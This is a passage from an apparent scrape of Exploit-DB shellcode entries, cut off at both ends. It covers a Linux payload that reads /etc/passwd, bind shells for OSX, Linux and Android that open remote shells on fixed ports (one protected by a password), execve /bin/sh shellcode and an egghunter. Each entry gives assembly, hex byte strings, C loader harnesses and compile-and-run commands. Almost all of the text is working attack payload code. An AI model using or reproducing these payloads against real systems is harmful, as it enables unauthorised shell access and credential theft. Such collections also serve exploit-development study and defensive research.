804809a:\t73 73                \tjae    0x804810f", " 804809c:\t77 64                \tja     0x8048102", " 804809e:\t23 41 4a             \tand    0x4a(%ecx),%eax", " 80480a1:\t49                   \tdec    %ecx", " 80480a2:\t54                   \tpush   %esp", " 80480a3:\t48                   \tdec    %eax", " 80480a4:\t41                   \tinc    %ecx", " 80480a5:\t4a                   \tdec    %edx", " 80480a6:\t49                   \tdec    %ecx", " 80480a7:\t54                   \tpush   %esp", " 80480a8:\t48                   \tdec    %eax", " 80480a9:\t4b                   \tdec    %ebx", " 80480aa:\t50                   \tpush   %eax", "---------------------------------------------------------------------------------------------------", "", "How To Run", "", "$ gcc -o cat_etc_passwd cat_etc_passwd.c", "$ execstack -s cat_etc_passwd", "$ ./cat_etc_passwd", "", "---------------------------------------------------------------------------------------------------", "*/", "#include <stdio.h>", "char sh[]=\"\\xeb\\x1f\\x5b\\x31\\xc0\\x88\\x43\\x0b\\x88\\x43\\x18\\x89\\x5b\\x19\\x8d\\x4b\\x0c\\x89\\x4b\\x1d\\x89\\x43\\x21\\xb0\\x0b\\x8d\\x4b\\x19\\x8d\\x53\\x21\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff\\x2f\\x2f\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x63\\x61\\x74\\x23\\x2f\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x23\\x41\\x4a\\x49\\x54\\x48\\x41\\x4a\\x49\\x54\\x48\\x4b\\x50\";", "// It will create file named 'ajith' with permission 7775", "void main(int argc, char **argv)", "{", "\tint (*func)();", "\tfunc = (int (*)()) sh;", "\t(int)(*func)();", "}"]},
{"Title": "OSX/x64 - Bind (4444/TCP) Shell (/bin/sh) + Null-Free Shellcode (144 bytes)", "Author": "Fitzl Csaba", "Published": ": 2015-09-10", "Platform": "OSX", "Download": "https://old.exploit-db.com/download/38126.c", "View": "https://old.exploit-db.com/raw/38126/", "code": [";OS X x64, TCP bind shellcode (port 4444), NULL byte free, 144 bytes long", ";ASM code", ";compile:", ";nasm -f macho64 bind-shellcode.asm ", ";ld -macosx_version_min 10.7.0 -o bindsc bind-shellcode.o", "", "BITS 64", "", "global start", "", "section .text", "", ";Argument order: rdi, rsi, rdx, rcx", "", "", "start:", "\t;socket", "\txor     rdi,rdi\t\t\t\t\t;zero out RSI", "\tmov     dil, 0x2\t\t\t\t;AF_INET = 2", "\txor     rsi,rsi\t\t\t\t\t;zero out RSI", "\tmov     sil, 0x1\t\t\t\t;SOCK_STREAM = 1", "\txor     rdx, rdx\t\t\t\t;protocol = IP = 0", "\t", "\t;store syscall number on RAX", "\txor     rax,rax\t\t\t\t\t;zero out RAX", "\tmov     al,2\t\t\t\t\t;put 2 to AL -> RAX = 0x0000000000000002", "\tror     rax, 0x28\t\t\t\t;rotate the 2 -> RAX = 0x0000000002000000", "\tmov     al,0x61\t\t\t\t\t;move 3b to AL (execve socket#) -> RAX = 0x0000000002000061", "\tmov\t\tr12, rax\t\t\t\t;save RAX", "    syscall\t\t\t\t\t\t\t;trigger syscall", "    ", "    ;bind", "    mov\t\tr9, rax\t\t\t\t\t;save socket number", "    mov \trdi, rax\t\t\t\t;put return value to RDI int socket", "    xor\t\trsi, rsi\t\t\t\t;zero out RSI", "    push\trsi\t\t\t\t\t\t;push RSI to the stack", "    mov\t\tesi, 0x5c110201\t\t\t;port number 4444 (=0x115c)", "    sub\t\tesi,1\t\t\t\t\t;make ESI=0x5c110200", "    push\trsi\t\t\t\t\t\t;push RSI to the stack", "    mov \trsi, rsp\t\t\t\t;store address", "    mov\t\tdl,0x10\t\t\t\t\t;length of socket structure 0x10", "    add\t\tr12b, 0x7\t\t\t\t;RAX = 0x0000000002000068 bind", "    mov\t\trax, r12\t\t\t\t;restore RAX", "    syscall", "    ", "    ;listen", "    ;RDI already contains the socket number", "    xor\t\trsi, rsi\t\t\t\t;zero out RSI", "\tinc\t\trsi\t\t\t\t\t\t;backlog = 1", "    add\t\tr12b, 0x2\t\t\t\t;RAX = 0x000000000200006a listen", "    mov\t\trax, r12\t\t\t\t;restore RAX", "    syscall", "    ", "    ;accept 30\tAUE_ACCEPT\tALL\t{ int accept(int s, caddr_t name, socklen_t\t*anamelen); } ", "    ;RDI already contains the socket number", "    xor\t\trsi, rsi\t\t\t\t;zero out RSI", "\t;RDX is already zero", "    sub\t\tr12b, 0x4c\t\t\t\t;RAX = 0x000000000200001e accept", "    mov\t\trax, r12\t\t\t\t;restore RAX", "    syscall", "    ", "    ;int dup2(u_int from, u_int to); ", "\tmov\t\trdi, rax", "\txor\t\trsi, rsi", "\tadd\t\tr12b, 0x3c\t\t\t\t;RAX = 0x000000000200005a dup2", "    mov\t\trax, r12\t\t\t\t;restore RAX", "    syscall", "    ", "    inc\t\trsi", "    mov \trax, r12\t\t\t\t;restore RAX", "    syscall", "", "\txor     rsi,rsi\t\t\t\t\t;zero out RSI", "\tpush    rsi\t\t\t\t\t\t;push NULL on stack", "\tmov     rdi, 0x68732f6e69622f2f\t;mov //bin/sh string to RDI (reverse)", "\tpush    rdi\t\t\t\t\t\t;push rdi to the stack", "\tmov     rdi, rsp\t\t\t\t;store RSP (points to the command string) in RDI", "\txor     rdx, rdx\t\t\t\t;zero out RDX", "\t", "\tsub\t\tr12b, 0x1f\t\t\t\t;RAX = 0x000000000200003b execve", "    mov\t\trax, r12\t\t\t\t;restore RAX", "    syscall\t\t\t\t\t\t\t;trigger syscall", "", "/*", "$ nasm -f bin bind-shellcode.asm ", "$ hexdump bind-shellcode", "0000000 48 31 ff 40 b7 02 48 31 f6 40 b6 01 48 31 d2 48", "0000010 31 c0 b0 02 48 c1 c8 28 b0 61 49 89 c4 0f 05 49", "0000020 89 c1 48 89 c7 48 31 f6 56 be 01 02 11 5c 83 ee", "0000030 01 56 48 89 e6 b2 10 41 80 c4 07 4c 89 e0 0f 05", "0000040 48 31 f6 48 ff c6 41 80 c4 02 4c 89 e0 0f 05 48", "0000050 31 f6 41 80 ec 4c 4c 89 e0 0f 05 48 89 c7 48 31", "0000060 f6 41 80 c4 3c 4c 89 e0 0f 05 48 ff c6 4c 89 e0", "0000070 0f 05 48 31 f6 56 48 bf 2f 2f 62 69 6e 2f 73 68", "0000080 57 48 89 e7 48 31 d2 41 80 ec 1f 4c 89 e0 0f 05", "0000090", "*/", "", "//C code", "//compile:", "//gcc bind-shellcode.c -o bindsc", "", "#include <stdio.h>", "#include <sys/mman.h>", "#include <string.h>", "#include <stdlib.h>", " ", "int (*sc)();", " ", "char shellcode[] =", "\"\\x48\\x31\\xff\\x40\\xb7\\x02\\x48\\x31\\xf6\\x40\\xb6\\x01\\x48\\x31\\xd2\\x48\" \\", "\"\\x31\\xc0\\xb0\\x02\\x48\\xc1\\xc8\\x28\\xb0\\x61\\x49\\x89\\xc4\\x0f\\x05\\x49\" \\", "\"\\x89\\xc1\\x48\\x89\\xc7\\x48\\x31\\xf6\\x56\\xbe\\x01\\x02\\x11\\x5c\\x83\\xee\" \\", "\"\\x01\\x56\\x48\\x89\\xe6\\xb2\\x10\\x41\\x80\\xc4\\x07\\x4c\\x89\\xe0\\x0f\\x05\" \\", "\"\\x48\\x31\\xf6\\x48\\xff\\xc6\\x41\\x80\\xc4\\x02\\x4c\\x89\\xe0\\x0f\\x05\\x48\" \\", "\"\\x31\\xf6\\x41\\x80\\xec\\x4c\\x4c\\x89\\xe0\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\" \\", "\"\\xf6\\x41\\x80\\xc4\\x3c\\x4c\\x89\\xe0\\x0f\\x05\\x48\\xff\\xc6\\x4c\\x89\\xe0\" \\", "\"\\x0f\\x05\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" \\", "\"\\x57\\x48\\x89\\xe7\\x48\\x31\\xd2\\x41\\x80\\xec\\x1f\\x4c\\x89\\xe0\\x0f\\x05\";", " ", "int main(int argc, char **argv) {", " ", "    void *ptr = mmap(0, 0x90, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON", "            | MAP_PRIVATE, -1, 0);", " ", "    if (ptr == MAP_FAILED) {", "        perror(\"mmap\");", "        exit(-1);", "    }", " ", "    memcpy(ptr, shellcode, sizeof(shellcode));", "    sc = ptr;", " ", "    sc();", " ", "    return 0;", "}"]},
{"Title": "Linux/x64 - execve(/bin/sh) Shellcode (34 bytes)", "Author": "Fanda Uchytil", "Published": ": 2015-09-11", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/38150.txt", "View": "https://old.exploit-db.com/raw/38150/", "code": ["# Exploit Title: Shellcode /bin/sh for Linux x86_64 (different approach)", "# Date: 2015-09-10", "# Exploit Author: Fanda Uchytil", "# Version: 1", "# Tested on: Linux 3.16.0-4-amd64 (Debian), 2.6.32-openvz-042stab093.5-amd64 (Centos/RHEL based), 2.6.32-5-amd64 (Debian)", "", "", "AT&T VERSION (for smooth debug)", "-------------------------------", "", ".global _start", ".text", "_start:", "    # int execve(const char *filename, char *const argv[], char *const envp[]);", "    xor     %rax, %rax", "    add     $59, %rax                   # Linux 64b execve", "    xor     %rdi, %rdi", "    push    %rdi                        # '\\0' for termination of string below", "    mov     $0x68732F2f6e69622F, %rdi   # \"/bin//sh\" (slash padding)", "    push    %rdi", "    lea     (%rsp), %rdi", "    xor     %rsi, %rsi                  # no shell arguments", "    xor     %rdx, %rdx                  # no env vars", "    syscall", "", "", "$ gcc -nostdlib shellcode_atnt.s -o shellcode_atnt && objdump -d shellcode_atnt", "$ ./shellcode_atnt", "$ gdb -q ./shellcode_atnt", "", "", "Disassembly of section .text:", "  4000d4:       48 31 c0                xor    %rax,%rax", "  4000d7:       48 83 c0 3b             add    $0x3b,%rax", "  4000db:       48 31 ff                xor    %rdi,%rdi", "  4000de:       57                      push   %rdi", "  4000df:       48 bf 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rdi", "  4000e6:       2f 73 68", "  4000e9:       57                      push   %rdi", "  4000ea:       48 8d 3c 24             lea    (%rsp),%rdi", "  4000ee:       48 31 f6                xor    %rsi,%rsi", "  4000f1:       48 31 d2                xor    %rdx,%rdx", "  4000f4:       0f 05                   syscall", "", "", "", "", "INTEL VERSION", "-------------", "", "    BITS 64", "    xor rax, rax", "    add rax, 59", "    xor rdi, rdi", "    push rdi", "    mov rdi, 0x68732F2f6e69622F", "    push rdi", "    lea rdi, [rsp]", "    xor rsi, rsi", "    xor rdx, rdx", "    syscall", "", "", "$ nasm shellcode.a", "", "", "", "", "SHELLCODE_TEST.C", "----------------", "", "  int main(int argc, char **argv) {", "      int (*f)() = (int(*)()) argv[1];", "      return (*f)();", "  }", "", "", "$ gcc -o shellcode_test shellcode_test.c -z execstack     # or use `execstack(8)` before command below", "$ ./shellcode_test \"$(cat shellcode)\"", "", "", "", "", "STRING", "------", "", "$ xxd -p -c 256 shellcode | tr -d '\\n' | sed 's/../\\\\&/g'", "\\48\\31\\c0\\48\\83\\c0\\3b\\48\\31\\ff\\57\\48\\bf\\2f\\62\\69\\6e\\2f\\2f\\73\\68\\57\\48\\8d\\3c\\24\\48\\31\\f6\\48\\31\\d2\\0f\\05", "", "$ ./shellcode_test \"$(printf \"$(xxd -p -c 256 shellcode | tr -d '\\n' | sed 's/../\\\\x&/g')\")\""]},
{"Title": "Google Android - Bind (1035/TCP) Telnetd Shell + Environment/Parameters Shellcode (248 bytes)", "Author": "Steven Padilla", "Published": ": 2015-09-15", "Platform": "Android", "Download": "https://old.exploit-db.com/download/38194.c", "View": "https://old.exploit-db.com/raw/38194/", "code": ["/* ", "Title:\tAndroid/ARM - telnetd with three parameters and an environment variable", "Date: 2015-07-31", "Tested on: Android Emulator and Samsung Note 10.1 (Android version 4.1.2)", "Author: Steven Padilla - email: spadilla@tresys.com", "Organization: Tresys LLC", "Vendor HomePage: www.tresys.com", "Version: 1.0", "", "", "Android ARM shellcode with dynamic string creation and including no", "0x20, 0x0a and 0x00.", "", "This shellcode will execute telnetd listening on port 1035.  Whenever", "anyone connects to port 1035 they will be presented with a shell", "prompt.  This code assumes that telnetd and sh are executables in the", "/system/bin/ directory.", "", "In order to minimize the length of the shellcode the beginning of the", "path /system/bin/ is created once and stored three times.", "", "The executable name (/system/bin/telnetd), the other two paramaters", "(-p1035 and -l/system/bin/sh) and the environment variable", "(PATH=/system/bin) are strings that are created and stored in memory", "above the top of the stack. The strings are created by first moving a", "byte to register1, left shitf register1 8 bits, add the next byte,", "left shift again, add the next byte, left shift again and then adding", "the fourth byte.  Note that due to endianess the bytes are added in", "reverse order.  Thus if the string to be created is \"/adb\" the 'b'", "would be moved into r1, followed by the shift and then the 'd' is", "added, shift, then the 'a', shift, and finally the '/'.", "", "In the example below the stack pointer has the value 0xbe91da08.", "", "Right before calling the execve call (i.e., svc 1 with register 7 containing", "11) register0 is loaded with the 0xbe91da24, register1 is loaded with", "the 0xbe91da0c and register2 is loaded with 0xbe91da1c.  The memory", "above the stack should look like the following (note to make it easier", "to read the strings are presented in the order they appear if you read", "them as strings.  If you look at each word you will see the bytes in", "reverse order due to endianess) :", "", "               +----------------------------------+", "0xbe91da08     | NULL                             |  This is where the stack ", "               |                                  |  pointer is pointing.", "               +----------------------------------+", "0xbe91da0c     | 0xbe91da24                       |  These first three entries ", "               |                                  |  are pointers to the path ", "               |                                  |  of the executable and its ", "               |                                  |  two parameters.", "               +----------------------------------+", "0xbe91da10     | 0xbe91da50                       |", "               +----------------------------------+", "0xbe91da14     | 0xbe91da5f                       |", "               +----------------------------------+", "0xbe91da18     | NULL                             | The list of parameters must", "               |                                  |  be terminated by a NULL.", "               +----------------------------------+", "0xbe91da1c     | 0xbe91da88                       | This points to the first ", "               |                                  | (and only) environment ", "               |                                  | variable.", "               +----------------------------------+", "0xbe91da20     | NULL                             | The list of environment ", "               |                                  | variables must be terminated", "               |                                  | by a NULL.", "               +----------------------------------+", "0xbe91da24     | \"//system/bin/telnetd\"           | This is where the name of ", "               |                                  | the executable and the first", "               |                                  | parameter is stored.", "               +----------------------------------+", "0xbe91da50     | \"-p1035\"                         | This is where the second ", "               |                                  | parameter is stored.", "               +----------------------------------+", "0xbe91da5f     | \"-l/system/bin/sh\"               | This is where the third ", "               |                                  | parameter is stored.", "               +----------------------------------+", "0xbe91da88     | \"PATH=/system/bin/\"              | This is where the first ", "               |                                  | environment variable is ", "               |                                  | stored.", "               +----------------------------------+", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char *SC = \t\"\\x01\\x30\\x8f\\xe2\" //add r3,pc, #1", "\t\t\"\\x13\\xff\\x2f\\xe1\" //bx r3", "\t\t\"\\x78\\x46\"\t   //mov r0, pc", "\t\t\"\\x18\\x30\" \t   //adds r0, 0x18", "\t\t\"\\x92\\x1a\"\t   // subs r2,r2,r2", "\t\t\"\\x49\\x1a\"         // subs r1, r1, r1", "", "\t\t\"\\x6a\\x44\"\t   // add r2, sp", "", "\t\t\"\\x79\\x21\"\t   // mov r1, 'y'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x73\\x31\"\t   // adds r1, 's'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x2f\\x31\"\t   // adds r1, '/'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x2f\\x31\"\t   // adds r1, '/'", "\t\t\"\\x07\\x91\"\t   // str r1, [sp, #4]", "", "\t\t\"\\x12\\x25\"\t   // mov r5, 0x12", "\t\t\"\\x4d\\x40\"\t   // eor r5,r1", "\t\t\"\\x21\\x95\"\t   // str r5, [sp, #4]", "", "\t\t\"\\x43\\x25\"\t   // mov r5, 0x43", "\t\t\"\\x4d\\x40\"\t   // eor r5,r1", "\t\t\"\\x16\\x95\"\t   // str r5, [sp, #4]", "", "\t\t\"\\x6d\\x21\"\t   // mov r1, 'm'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x65\\x31\"\t   // adds r1, 'e'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x74\\x31\"\t   // adds r1, 't'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x73\\x31\"\t   // adds r1, 's'", "\t\t\"\\x08\\x91\"\t   // str r1, [sp, 0x8]", "\t\t\"\\x17\\x91\"\t   // str r1, [sp, 0x17]", "\t\t\"\\x22\\x91\"\t   // str r1, [sp, 0x22]", "", "\t\t\"\\x6e\\x21\"\t   // mov r1, 'n'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x69\\x31\"\t   // adds r1, 'i'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x62\\x31\"\t   // adds r1, 'b'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x2f\\x31\"\t   // adds r1, '/'", "\t\t\"\\x09\\x91\"\t   // str r1, [sp, 0x9]", "\t\t\"\\x18\\x91\"\t   // str r1, [sp, 0x18]", "\t\t\"\\x23\\x91\"\t   // str r1, [sp, 0x23]", "", "\t\t\"\\x6c\\x21\"\t   // mov r1, 'l'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x65\\x31\"\t   // adds r1, 'e'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x74\\x31\"\t   // adds r1, 't'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x2f\\x31\"\t   // adds r1, '/'", "              \t\"\\x28\\x24\"         // mov r4, 0x0f", "                \"\\x11\\x51\"         // str r1, [r2, r4] ", "", "\t\t\"\\x6c\\x25\"\t   // mov r5, 'l'", "\t\t\"\\x2d\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x0d\\x35\"\t   // adds r5, 0x0d", "\t\t\"\\x2d\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x07\\x35\"\t   // adds r5, 0x07", "\t\t\"\\x2d\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x4d\\x40\"\t   // eor r5,r1", "\t\t\"\\x19\\x95\"\t   // str r5, [sp, 0x19]", "", "\t\t\"\\x64\\x21\"\t   // mov r1, 'd'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x74\\x31\"\t   // adds r1, 't'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x65\\x31\"\t   // adds r1, 'e'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x6e\\x31\"\t   // adds r1, 'n'", "\t\t\"\\x0b\\x91\"\t   // str r1, [sp, 0xb]", "", "\t\t\"\\x49\\x1a\"         // subs r1, r1, r1", "\t\t\"\\x0c\\x91\"\t   // str r1, [sp, 0xc]", "", "\t\t\"\\x30\\x21\"\t   // mov r1, '0'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x31\\x31\"\t   // adds r1, '1'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x70\\x31\"\t   // adds r1, 'p'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x2d\\x31\"\t   // adds r1, '-'", "\t\t\"\\x12\\x91\"\t   // str r1, [sp, #44]", "", "\t\t\"\\x49\\x1a\"         // subs r1, r1, r1", "\t\t\"\\x35\\x31\"\t   // add r1, '5'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x33\\x31\"\t   // adds r1, '3'", "\t\t\"\\x13\\x91\"\t   // str r1, [sp, 0x13]", "", "\t\t\"\\x49\\x1a\"         // subs r1, r1, r1", "\t\t\"\\x14\\x91\"\t   // str r1, [sp, 0x14]", "", "\t\t\"\\x2d\\x21\"\t   // mov r1, '-'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x15\\x91\"\t   // str r1, [sp, 0x15]", "", "\t\t\"\\x49\\x1a\"         // subs r1, r1, r1", "\t\t\"\\x1f\\x91\"\t   // str r1, [sp, 0x1f]", "", "\t\t\"\\x48\\x21\"\t   // mov r1, 'H'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x54\\x31\"\t   // adds r1, 'T'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x41\\x31\"\t   // adds r1, 'A'", "\t\t\"\\x09\\x02\"\t   // LSL r1,r1, #8", "\t\t\"\\x50\\x31\"\t   // adds r1, 'P'", "\t\t\"\\x80\\x24\"         // mov r4, 0x0f", "                \"\\x11\\x51\"         // str r1, [r2, r4] ", "", "\t\t\"\\x2f\\x21\"\t   // mov r1, '/'", "\t\t\"\\x24\\x91\"\t   // str r1, [sp, 0x24]", "", "\t\t\"\\x04\\x32\"\t   // add r2, 0x4", "", "\t\t\"\\x49\\x1a\"         // subs r1, r1, r1", "\t\t\"\\x11\\x1c\"\t   // add r1, r2, #0 ", "\t\t\"\\x18\\x31\"\t   // add r1, 0x18", "\t\t\"\\x01\\x91\"\t   // str r1, [sp, 0x1]", "", "\t\t\"\\x2c\\x31\"\t   // add r1, #40", "\t\t\"\\x02\\x91\"\t   // str r1, [sp, 0x2]", "", "\t\t\"\\x0f\\x31\"\t   // add r1, #4", "\t\t\"\\x03\\x91\"\t   // str r1, [sp, 0x3]", "", "\t\t\"\\x29\\x31\"\t   // add r1, #28", "\t\t\"\\x05\\x91\"\t   // str r1, [sp, #0x5]", "", "\t\t\"\\x49\\x1a\"         // subs r1, r1, r1", "\t\t\"\\x04\\x91\"         // str r1, [sp, 0x4]", "", "\t\t\"\\x06\\x91\"         // str r1, [sp, 0x6]", "", "\t\t\"\\x10\\x1c\"\t   // add r0, r2, #0 ", "\t\t\"\\x18\\x30\"\t   // add r0, 0x18", "", "\t\t\"\\x11\\x1c\"\t   // add r1, r2, #0 ", "\t\t", "\t\t\"\\x10\\x32\"\t   // adds r2, 0x10", "", "\t\t\"\\xdb\\x1a\"         // subs r3, r3, r3", "\t\t", "", "\t\t\"\\x0b\\x27\"\t   //movs r7,#11", "\t\t\"\\x01\\xdf\";\t   //svc 1", "", "int main(void)", "{", "\t(*(void(*) ()) SC) ();", "\treturn 0;", "}"]},
{"Title": "Linux/x64 - execve() Shellcode (22 bytes)", "Author": "d4sh&r", "Published": ": 2015-09-18", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/38239.asm", "View": "https://old.exploit-db.com/raw/38239/", "code": [";Title: execve shellcode 22 bytes", ";Author: d4sh&r", ";Contact: https://mx.linkedin.com/in/d4v1dvc", ";Category: Shellcode", ";Architecture:linux x86_64", ";SLAE64-1379", ";Description:", ";Shellcode in 22 bytes to get a shell ", ";Tested on : Linux kali64 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 x86_64 GNU/Linux", "", ";Compilation and execution", ";nasm -felf64 shell.nasm -o shell.o", ";ld shell.o -o shell", ";./shell", "", "global _start", "", "_start:", "\tmul esi", "\tpush rdx                         ", "\tmov rbx, 0x68732f2f6e69622f ;/bin//sh ", "\tpush rbx", "\tlea rdi, [rsp] ;address of /bin//sh", "\tmov al, 59 ;execve", "\tsyscall", "", "/*compile with gcc -fno-stack-protector -z exestack */", "", "unsigned char code[] = \"\\xf7\\xe6\\x52\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x8d\\x3c\\x24\\xb0\\x3b\\x0f\\x05\";", "", "main()", "{", "   int (*ret)()=(int(*)()) code;", "    ret();", "}"]},
{"Title": "Linux/x64 - Bind (31173/TCP) Shell (/bin/sh) + Password (1234) Shellcode (92 bytes)", "Author": "d4sh&r", "Published": ": 2015-10-15", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/38469.c", "View": "https://old.exploit-db.com/raw/38469/", "code": ["/*", ";Title:            bindshell with password in 92 bytes ", ";Author:           David Vel\u00e1zquez a.k.a d4sh&r", ";Contact:          https://mx.linkedin.com/in/d4v1dvc", ";Description:      x64 Linux bind TCP port shellcode on port 31173 with 4 bytes as password  in 94 bytes", ";Tested On:        Linux kali64 3.18.0-kali3-amd64 x86_64 GNU/Linux ", "", ";Compile & Run:    nasm -f elf64 -o bindshell.o bindshell.nasm", ";                  ld -o bindshell bindshell.o", ";                  ./bindshell", ";SLAE64-1379", "", "", "global _start", "", "  ", "_start:", "", "socket:", "    ;int socket(int domain, int type, int protocol)2,1,0", "    xor esi,esi                      ;rsi=0", "    mul esi                          ;rdx,rax,rsi=0, rdx is 3rd argument                 ", "    inc esi                          ;rsi=1, 2nd argument", "    push 2                           ", "    pop rdi                          ;rdi=2,1st argument", "    add al, 41                       ;socket syscall", "    syscall", " ", "    push rax\t                     ;socket result", "    pop rdi                          ;rdi=sockfd", "", "    ;struct sockaddr_in {", "    ;           sa_family_t    sin_family; /* address family: AF_INET */", "    ;           in_port_t      sin_port;   /* port in network byte order */", "    ;           struct in_addr sin_addr;   /* internet address */", "    ;};", "", "    push 2\t\t\t     ;AF_INET", "    mov word [rsp + 2], 0xc579       ;port 31173", "    push rsp                        ", "    pop rsi                          ;rsi=&sockaddr", " ", "bind:", "    ;int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen)", "    push rdx                         ;initialize with 0 to avoid SEGFAULT", "    push 16                         ", "    pop rdx                          ;rdx=16 (sizeof sockaddr) ", "    push 49\t\t\t     ;bind syscall", "    pop rax", "    syscall", " ", "listen:", "    ;int listen(int sockfd, int backlog)", "    pop rsi                ", "    mov al, 50 \t\t\t     ;listen syscall", "    syscall", "", "accept: ", "    ;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)", "    mov al, 43                       ;accept syscall", "    syscall", " ", "    ;store client", "    push rax                         ;accept result(client)", "    pop rdi                          ;rdi=client", "", "    ;don't to close parent to have a small shellcode", "    ;in a loop is necessary to close the conection!!", "", "password: ", "    ;ssize_t read(int fd, void *buf, size_t count)", "    push rsp                         ;1st argument", "    pop rsi                          ;2nd argument    ", "    xor eax, eax                     ;read syscall", "    syscall", " ", "    cmp dword [rsp], '1234'          ;\"1234\" like password", "    jne error                        ; if wrong password then crash program", "", "    ;int dup2(int oldfd, int newfd)", "    push 3", "    pop rsi    ", "", "dup2:", "    dec esi", "    mov al, 33                       ;dup2 syscall applied to error,output and input", "    syscall", "    jne dup2", "", "execve: ", "    ;int execve(const char *filename, char *const argv[],char *const envp[])", "    push rsi                         ", "    pop rdx                          ;3rd argument", "    push rsi                         ;2nd argument", "    mov rbx, 0x68732f2f6e69622f      ;1st argument /bin//sh ", "    push rbx", "    push rsp", "    pop rdi", "    mov al, 59\t\t\t     ;execve", "    syscall", "", "error:", "    ;SEGFAULT", "", "*/", "", "#include<stdio.h>", "#include<string.h>", "//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode", "unsigned char code[] = \\", "\"\\x31\\xf6\\xf7\\xe6\\xff\\xc6\\x6a\\x02\\x5f\\x04\\x29\\x0f\\x05\\x50\\x5f\\x6a\\x02\\x66\\xc7\\x44\\x24\\x02\\x79\\xc5\\x54\\x5e\\x52\\x6a\\x10\\x5a\\x6a\\x31\\x58\\x0f\\x05\\x5e\\xb0\\x32\\x0f\\x05\\xb0\\x2b\\x0f\\x05\\x50\\x5f\\x54\\x5e\\x31\\xc0\\x0f\\x05\\x81\\x3c\\x24\\x31\\x32\\x33\\x34\\x75\\x1f\\x6a\\x03\\x5e\\xff\\xce\\xb0\\x21\\x0f\\x05\\x75\\xf8\\x56\\x5a\\x56\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05\"; ", "", "main()", "{", "", "  printf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "\tint (*ret)() = (int(*)())code;", "\tret();", "", "}"]},
{"Title": "Linux/x64 - Egghunter (0x6b634068) Shellcode (24 bytes)", "Author": "d4sh&r", "Published": ": 2015-11-16", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/38708.asm", "View": "https://old.exploit-db.com/raw/38708/", "code": ["/*", ";Title:            x64 Linux egghunter in 24 bytes ", ";Author:           David Vel\u00e1zquez a.k.a d4sh&r", ";Contact:          https://mx.linkedin.com/in/d4v1dvc", ";Description:      x64 Linux egghunter that looks for the string \"h@ckh@ck\"", ";                  and then execute the shellcode", ";Tested On:        Linux kali64 3.18.0-kali3-amd64 x86_64 GNU/Linux ", " ", ";Compile & Run:    nasm -f elf64 -o egghunter.o egghunter.nasm", ";                  ld -o egghunter egghunter.o", ";SLAE64-1379", "", "global _start", "", "_start:", "    pop rax  ; some address in the stack ", "search:", "        inc rax       ", "        cmp [rax - 4] , dword 0x6b634068 ; \"h@ck\"  ", "jnz search   ", "        cmp [rax - 8] , dword 0x6b634068 ; \"h@ck\"  ", "jnz search", "        call  rax   ; execute shellcode ", "*/", "#include<stdio.h>", "#include<string.h>", "//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode", "unsigned char hunter[] = \"\\x58\\x48\\xff\\xc0\\x81\\x78\\xfc\\x68\\x40\\x63\\x6b\\x75\\xf4\\x81\\x78\\xf8\\x68\\x40\\x63\\x6b\\x75\\xeb\\xff\\xd0\";", "unsigned char egg[] = \\", "\"\\x68\\x40\\x63\\x6b\"  //egg", "\"\\x68\\x40\\x63\\x6b\"  //egg", 